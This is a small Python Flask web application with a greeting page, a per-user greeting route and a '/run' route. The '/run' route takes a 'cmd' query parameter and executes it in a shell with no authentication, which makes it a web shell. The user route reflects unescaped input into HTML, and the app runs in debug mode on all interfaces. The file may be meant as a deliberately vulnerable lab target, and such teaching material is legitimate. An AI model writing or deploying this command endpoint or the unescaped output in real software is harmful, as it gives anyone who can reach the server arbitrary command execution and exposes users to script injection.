from flask import Flask, request
import os, subprocess
app = Flask(__name__)

@app.route('/')
def index():
    return "<h1>Hello, World!</h1></br> Version: 1.0 "

@app.route('/user/<name>')
def user(name):
	return '<h1>Hello, {0}!</h1>'.format(name)

@app.route('/run')
def cmd():
    cmd = request.args.get('cmd')
    print(cmd)
    result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
    return result.stdout

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True)

